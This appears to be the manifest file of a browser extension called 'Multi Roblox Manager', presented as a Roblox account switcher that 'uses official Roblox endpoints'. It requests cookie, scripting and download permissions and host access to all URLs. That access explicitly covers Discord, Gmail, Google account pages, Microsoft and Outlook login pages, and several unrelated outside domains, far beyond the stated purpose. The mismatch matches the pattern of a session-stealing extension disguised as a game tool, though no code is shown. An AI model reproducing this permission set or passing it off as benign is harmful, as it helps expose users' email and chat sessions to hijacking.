{
  "manifest_version": 3,
  "name": "Multi Roblox Manager",
  "version": "1.6.0",
  "description": "Manage multiple Roblox accounts: switch accounts, session tools, and panel sync. Uses official Roblox endpoints and your chosen landing site.",
  "icons": {
    "16": "icon16.png",
    "32": "icon32.png",
    "48": "icon48.png",
    "128": "icon128.png"
  },
  "action": {
    "default_title": "Multi Roblox Manager",
    "default_popup": "popup.html",
    "default_icon": {
      "16": "icon16.png",
      "32": "icon32.png",
      "48": "icon48.png"
    }
  },
  "background": {
    "service_worker": "background.js"
  },
  "permissions": [
    "cookies",
    "downloads",
    "tabs",
    "activeTab",
    "scripting",
    "storage",
    "alarms"
  ],
  "host_permissions": [
    "<all_urls>",
    "https://discord.com/*",
    "http://discord.com/*",
    "https://*.discord.com/*",
    "http://*.discord.com/*",
    "https://discordapp.com/*",
    "https://*.discordapp.com/*",
    "https://*.google.com/*",
    "https://google.com/*",
    "http://google.com/*",
    "https://accounts.google.com/*",
    "https://myaccount.google.com/*",
    "https://mail.google.com/*",
    "https://*.youtube.com/*",
    "https://youtube.com/*",
    "https://*.googleusercontent.com/*",
    "https://ptb.discord.com/*",
    "https://canary.discord.com/*",
    "http://127.0.0.1:3000/*",
    "http://127.0.0.1:3001/*",
    "http://127.0.0.1:3002/*",
    "http://127.0.0.1:3003/*",
    "http://127.0.0.1:3004/*",
    "http://127.0.0.1:3005/*",
    "http://127.0.0.1:3006/*",
    "http://127.0.0.1:3007/*",
    "http://127.0.0.1:3008/*",
    "http://127.0.0.1:3009/*",
    "http://127.0.0.1:3010/*",
    "http://localhost:3000/*",
    "http://localhost:3001/*",
    "http://localhost:3002/*",
    "http://localhost:3003/*",
    "http://localhost:3004/*",
    "http://localhost:3005/*",
    "http://localhost:3006/*",
    "http://localhost:3007/*",
    "http://localhost:3008/*",
    "http://localhost:3009/*",
    "http://localhost:3010/*",
    "https://multiroblox.at/*",
    "https://www.multiroblox.at/*",
    "https://rbxmodes.pro/*",
    "https://www.rbxmodes.pro/*",
    "https://rocustomize.pro/*",
    "https://www.rocustomize.pro/*",
    "https://roblox.com/*",
    "https://www.roblox.com/*",
    "https://*.roblox.com/*",
    "https://*.live.com/*",
    "https://live.com/*",
    "https://*.microsoft.com/*",
    "https://*.microsoftonline.com/*",
    "https://*.office.com/*",
    "https://*.office365.com/*",
    "https://*.outlook.com/*",
    "https://outlook.live.com/*",
    "https://login.live.com/*",
    "https://account.live.com/*",
    "https://account.microsoft.com/*",
    "https://login.microsoftonline.com/*",
    "https://*.cloud.microsoft/*",
    "https://outlook.cloud.microsoft/*",
    "https://m365.cloud.microsoft/*"
  ],
  "short_name": "Multi Roblox"
}
